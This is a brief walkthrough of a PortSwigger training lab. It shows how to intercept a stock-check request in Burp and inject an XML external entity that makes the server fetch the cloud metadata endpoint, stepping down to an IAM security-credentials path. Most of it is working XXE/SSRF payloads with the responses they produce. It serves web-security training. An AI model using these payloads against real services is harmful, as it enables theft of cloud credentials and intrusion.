# [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)

> exploit the check store request with xml input trough ssrf

- open burp
- open page in browser
- navigate to a product
- click "check store" button
- check history in burp
- send the `/product/stock` request to the repeater
- will see the following:

```
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

- change it to

```
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://169.254.169.254">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

- this will give back a response

```
HTTP/2 400 Bad Request
...
"Invalid product ID: latest"
```

- lets try to add the `latest` to the url

```
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

- it will respond with an another 400, but different message

```
HTTP/2 400 Bad Request
...
"Invalid product ID: meta-data"
```

- add the `meta-data` after the `latest` what will give back another response, and do it until it respond with some sensitive data

- the final request should look like this

```
POST /product/stock HTTP/2
...
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```
